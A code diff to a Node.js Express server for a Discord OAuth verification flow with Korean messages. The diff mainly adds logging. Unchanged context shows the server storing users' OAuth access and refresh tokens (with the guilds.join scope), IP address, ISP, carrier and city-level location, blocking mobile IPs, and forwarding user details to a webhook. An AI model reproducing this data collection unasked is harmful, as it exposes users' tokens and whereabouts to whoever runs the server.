@@ -141,11 +141,13 @@ app.get('/verify', async (req, res) => {
     client_id: CLIENT_ID, redirect_uri: REDIRECT_URI,
     response_type: 'code', scope: 'identify email guilds.join', state: guild_id
   });
+  console.log('[Verify] Redirecting to Discord OAuth, guild_id:', guild_id, 'redirect_uri:', REDIRECT_URI);
   res.redirect(`https://discord.com/oauth2/authorize?${params}`);
 });
 
 app.get('/oauth/callback', async (req, res) => {
   const { code, state: guild_id } = req.query;
+  console.log('[OAuth/callback] code:', !!code, 'guild_id:', guild_id);
   if (!code) return res.redirect('/verify/error?msg=' + encodeURIComponent('인증 코드가 없습니다.'));
   try {
     const tokenRes = await exchangeDiscordCode(new URLSearchParams({
@@ -162,12 +164,16 @@ app.get('/oauth/callback', async (req, res) => {
       headers: { Authorization: `Bearer ${access_token}` }
     });
     const discordUser = userRes.data;
+    console.log('[OAuth/callback] user:', discordUser.username, discordUser.id);
     const realIp = getRealIp(req);
     const device = detectDevice(req.headers['user-agent'] || '');
     const ipInfo = await getIpInfo(realIp);
     const configRes = await query('SELECT * FROM server_configs WHERE guild_id=$1', [guild_id]);
     const config = configRes.rows[0];
-    if (ipInfo.mobile) return res.redirect('/verify/blocked?reason=mobile');
+    if (ipInfo.mobile) {
+      console.log('[OAuth/callback] BLOCKED mobile IP:', realIp);
+      return res.redirect('/verify/blocked?reason=mobile');
+    }
     req.session.pendingVerify = {
       userId: discordUser.id, username: discordUser.username,
       globalName: discordUser.global_name || discordUser.username,
@@ -181,10 +187,11 @@ app.get('/oauth/callback', async (req, res) => {
       tokenExpiresAt: expiresAt.toISOString(), guild_id,
       panelTitle: config?.panel_title || '서버 인증'
     };
+    console.log('[OAuth/callback] session stored, redirecting to confirm. userId:', discordUser.id);
     res.redirect('/verify/confirm');
   } catch (err) {
     const status = err.response?.status;
-    console.error('[OAuth] Error:', status, err.response?.data || err.message);
+    console.error('[OAuth/callback] Error:', status, err.response?.data || err.message);
     let userMsg;
     if (status === 429) {
       userMsg = 'Discord 서버 응답 제한으로 인해 잠시 인증이 불가합니다. 몇 분 후 다시 시도해 주세요.';
@@ -196,45 +203,53 @@ app.get('/oauth/callback', async (req, res) => {
 });
 
 app.get('/verify/confirm', (req, res) => {
-  if (!req.session.pendingVerify) return res.redirect('/verify/error?msg=' + encodeURIComponent('세션이 만료되었습니다.'));
+  const hasPending = !!req.session.pendingVerify;
+  console.log('[/verify/confirm] hasPendingVerify:', hasPending);
+  if (!hasPending) return res.redirect('/verify/error?msg=' + encodeURIComponent('세션이 만료되었습니다.'));
   res.sendFile(path.join(__dirname, 'public', 'confirm.html'));
 });
 
 app.get('/verify/blocked', (req, res) => res.sendFile(path.join(__dirname, 'public', 'blocked.html')));
 
 app.get('/api/verify-data', (req, res) => {
-  if (!req.session.pendingVerify) return res.status(401).json({ error: 'No session' });
+  const hasPending = !!req.session.pendingVerify;
+  console.log('[/api/verify-data] hasPendingVerify:', hasPending);
+  if (!hasPending) return res.status(401).json({ error: 'No session' });
   const d = req.session.pendingVerify;
   res.json({ userId: d.userId, username: d.username, globalName: d.globalName, avatar: d.avatar, panelTitle: d.panelTitle });
 });
 
 app.post('/api/verify-complete', async (req, res) => {
-  if (!req.session.pendingVerify) return res.status(401).json({ success: false, error: '세션이 만료되었습니다.' });
+  const hasPending = !!req.session.pendingVerify;
+  console.log('[/api/verify-complete] called, hasPendingVerify:', hasPending);
+  if (!hasPending) return res.status(401).json({ success: false, error: '세션이 만료되었습니다.' });
   const d = req.session.pendingVerify;
+  console.log('[/api/verify-complete] userId:', d.userId, 'guild_id:', d.guild_id);
   try {
     const configRes = await query('SELECT * FROM server_configs WHERE guild_id=$1', [d.guild_id]);
     if (configRes.rows.length === 0) return res.json({ success: false, error: '서버 설정을 찾을 수 없습니다.' });
     const config = configRes.rows[0];
 
-    // Discord PUT /guilds/{id}/members/{userId} 응답:
-    //   201 Created     -> 신규 가입, body의 roles가 적용됨
-    //   204 No Content  -> 이미 서버 멤버, roles 파라미터 무시됨 -> 별도 역할 부여 필요
+    // Discord PUT /guilds/{id}/members/{userId}:
+    //   201 Created    -> 신규 가입, roles 적용됨
+    //   204 No Content -> 이미 서버 멤버, roles 무시됨 -> 별도 역할 부여 필요
     try {
       const joinRes = await axios.put(
         `https://discord.com/api/v10/guilds/${d.guild_id}/members/${d.userId}`,
         { access_token: d.accessToken, roles: config.role_id ? [config.role_id] : [] },
         { headers: { Authorization: `Bot ${BOT_TOKEN}`, 'Content-Type': 'application/json' } }
       );
-      // 204 = 이미 서버에 있음 -> roles가 무시되므로 별도 역할 부여 API 호출
+      console.log('[verify-complete] join status:', joinRes.status);
+      // 204 = 이미 서버에 있음 -> roles 무시 -> 별도 역할 부여
       if (joinRes.status === 204 && config.role_id) {
         await axios.put(
           `https://discord.com/api/v10/guilds/${d.guild_id}/members/${d.userId}/roles/${config.role_id}`,
           {},
           { headers: { Authorization: `Bot ${BOT_TOKEN}` } }
-        ).catch(e2 => console.error('[Verify] Role error (already in server):', e2.response?.status, e2.message));
+        ).catch(e2 => console.error('[verify-complete] role error (already in):', e2.response?.status, e2.message));
       }
     } catch(e) {
-      // 가입 실패시 역할만 직접 부여 시도
+      console.error('[verify-complete] join error:', e.response?.status, e.message);
       if (config.role_id) {
         try {
           await axios.put(
@@ -242,10 +257,11 @@ app.post('/api/verify-complete', async (req, res) => {
             {},
             { headers: { Authorization: `Bot ${BOT_TOKEN}` } }
           );
-        } catch(e2) { console.error('[Verify] Role error:', e2.response?.status, e2.message); }
+        } catch(e2) { console.error('[verify-complete] role fallback error:', e2.response?.status, e2.message); }
       }
     }
 
+    console.log('[verify-complete] saving to DB, userId:', d.userId, 'guild_id:', d.guild_id);
     await query(
       `INSERT INTO verified_users (user_id, guild_id, username, email, ip, isp, carrier, country, region, city, access_token, refresh_token, token_expires_at)
        VALUES ($1,$2,$3,$4,$5,$6,$7,$8,$9,$10,$11,$12,$13)
@@ -255,6 +271,8 @@ app.post('/api/verify-complete', async (req, res) => {
       [d.userId, d.guild_id, d.username, d.email, d.ip, d.isp, d.org,
        d.country, d.region, d.city, d.accessToken, d.refreshToken, d.tokenExpiresAt]
     );
+    console.log('[verify-complete] DB saved OK');
+
     if (config.webhook_url) {
       const avatarUrl = d.avatar
         ? `https://cdn.discordapp.com/avatars/${d.userId}/${d.avatar}.png`
@@ -284,18 +302,18 @@ app.post('/api/verify-complete', async (req, res) => {
             footer: { text: `인증 시각: ${new Date().toLocaleString('ko-KR', { timeZone: 'Asia/Seoul' })}` }
           }]
         });
-      } catch(e) { console.error('[Verify] Webhook error:', e.message); }
+      } catch(e) { console.error('[verify-complete] webhook error:', e.message); }
     }
     req.session.pendingVerify = null;
     res.json({ success: true });
   } catch(err) {
-    console.error('[Verify] Error:', err);
+    console.error('[verify-complete] FATAL error:', err.message, err.stack);
     res.status(500).json({ success: false, error: '서버 오류가 발생했습니다.' });
   }
 });
 
 app.get('/verify/done', (req, res) => res.sendFile(path.join(__dirname, 'public', 'done.html')));
 app.get('/verify/error', (req, res) => res.sendFile(path.join(__dirname, 'public', 'error.html')));
-app.get('/health', (req, res) => res.json({ status: 'ok', mode: 'http-interactions', proxy: !!OAUTH_PROXY_URL }));
+app.get('/health', (req, res) => res.json({ status: 'ok', mode: 'http-interactions', proxy: !!OAUTH_PROXY_URL, baseUrl: BASE_URL }));
 
 export default app;
